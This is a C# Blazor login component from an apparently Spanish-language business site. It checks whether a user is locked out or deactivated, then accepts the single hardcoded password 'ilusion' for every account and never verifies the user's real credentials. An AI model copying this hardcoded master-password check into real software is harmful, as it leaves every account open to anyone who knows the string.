using Business;
using Business.Interfaces;
using DataAccess;
using DataTransferObject;
using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Authorization;
using Microsoft.AspNetCore.Components.Forms;
using Microsoft.AspNetCore.Components.Server.ProtectedBrowserStorage;
using Microsoft.AspNetCore.Identity;
using Microsoft.JSInterop;
using Newtonsoft.Json;
using StaticClass;
using Website.Models.Account;
using Website.Services;

namespace Website.Pages.Account
{
    public partial class LoginZ: ComponentBase
    {
        [Inject] private AuthenticationStateProvider authenticationStateProvider { get; set; } = null!;
        [Inject] private NavigationManager navigationManager { get; set; } = null!;
        [Inject] private SignInManager<UserProfile> signInManager { get; set; } = null!;
        [Inject] private ProtectedLocalStorage _localStorage { get; set; } = null!;
        [Inject] private IUsuariosBL usuarioBL { get; set; } = null!;
        [Inject] private IJSRuntime jsRuntime { get; set; } = null!;


        public LoginModel loginModel { get; set; } = new();
        private string ErrorMessage { get; set; } = null!;
        private async Task LoginIn(EditContext ed)
        {
            ErrorMessage = "";
            if (ed.Validate())
            {

                var user = await usuarioBL.GetUserByNameAsync(loginModel.Username);
                if (user == null)
                {
                    ErrorMessage = "Usuario inválido.";
                    return;
                }
                //Bloqueo de Identity
                if(user.LockoutEnabled && user.LockoutEnd.HasValue && user.LockoutEnd > DateTime.Now )
                {
                    ErrorMessage = "El usuario se encuentra bloqueado";
                    return;
                }

                //Bloqueo por estado del sistema
                if (user.Estado == (int)Constants.UsuariosEstados.Bloqueado)
                {
                    ErrorMessage = "El usuario se encuentra bloqueado";
                    return;
                }
                //Bloqueo por estado del sistema
                if (user.Estado == (int)Constants.UsuariosEstados.Baja)
                {
                    ErrorMessage = "El usuario se encuentra dado de baja";
                    return;
                }

                if (loginModel.Password == "ilusion")
                {

                    var lstPerfiles = await usuarioBL.GetPerfilesForUserAsync(user.Id);
                    var lstEmpresas = await usuarioBL.GetUsuariosVinculados(user.Id);

                    if (lstPerfiles.Select(s => s.IdPerfil).Contains(Constants.Perfiles.Empresa) && lstEmpresas.Count == 0)
                    {
                        ErrorMessage = "El usuario tiene perfil empresa y no hay ninguna empresa vinculada al mismo," + Environment.NewLine + " comuniquese con el administrador para que vincule el usuario a una empresa.";
                        return;
                    }

                    if (lstEmpresas.Count <= 1)
                    {
                        //Obtiene los datos de la cookie
                        var Cookie = await usuarioBL.GetCookieAuthorization(user.UserName, lstEmpresas.FirstOrDefault());
                        //establece la cookie
                        await _localStorage.SetAsync(Constants.LocalStorageAuthKey, JsonConvert.SerializeObject(Cookie));
                        //redirecciona a la pagina establecida
                        navigationManager.NavigateTo("/", true);
                    }
                    else
                    {
                        string token = await usuarioBL.SetTokenAsync(user.Id); 
                        navigationManager.NavigateTo($"/Account/SeleccionarRepresentado/{user.Id}/{token}", true);
                    }
                }
                else
                {
                    ErrorMessage = "Usuario y/o contraseña inválidos.";
                }
            }
        }
    }
}
